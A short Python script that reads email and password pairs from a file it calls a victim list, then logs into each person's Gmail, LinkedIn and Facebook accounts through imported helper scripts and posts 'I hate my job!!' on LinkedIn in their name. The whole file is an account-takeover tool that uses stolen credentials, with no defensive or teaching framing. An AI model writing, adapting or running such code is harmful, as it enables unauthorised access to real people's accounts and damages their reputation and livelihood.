from scripts.LoginToGmail import gmailLogin
from scripts.postOnLinkedin import loginAndPostLinkedin
from scripts.LoginToFacebook import loginFacebook



def makeVictimList():
    lst=[]
    file = open("list.txt","r")
    while True:
        line= file.readline()
        if not line:
            break
        email = line[12:-1:]
        line= file.readline()
        password = line[17:-1:]
        lst.append((email,password))
    return lst


lst =  makeVictimList()
for user in lst:
    username = user[0]
    password = user[1]
    gmailLogin(username,password)
    loginAndPostLinkedin(username, password , "I hate my job!!")
    loginFacebook(username,password)
    

